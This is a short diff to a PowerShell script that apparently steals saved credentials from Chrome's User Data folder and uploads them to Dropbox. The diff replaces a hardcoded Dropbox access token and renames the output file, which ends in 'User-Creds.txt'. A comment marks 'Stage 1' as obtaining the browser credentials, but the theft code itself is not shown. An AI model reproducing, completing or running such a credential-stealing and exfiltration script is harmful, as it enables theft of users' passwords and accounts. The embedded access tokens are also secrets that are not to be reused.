@@ -10,9 +10,9 @@
 	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
 #>
 
-$DropBoxAccessToken = "sl.BXrAQczJgUChuKNCn7RdlMxx2z9ft2BvA2fe1O65HVTbnarcAsSCLN4YSMSoqoYVKhosSStqm-m0JBwtV-5uAjWs9M92_0PAzanE6S8o4letOfaBzGyrFWNkvFXa8xWt9tlbKJ7HtDzm"
+$DropBoxAccessToken = "sl.BXq5I1V9yZfrRBknI5AkCato_qaxCaL0fvDZqrNqFxDqmdUDmAhIyrDIoYOow5Wxry8QLXnB1AnblIp72kf1v4neEFl4joMDEO0h88XVqBHY8g--4VobP2CRdB3inJF0_q4vHGmTSPwf"
 
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)h_User-Credsg.txt"
 
 #Stage 1 Obtain the credentials from the Chrome browsers User Data folder
 
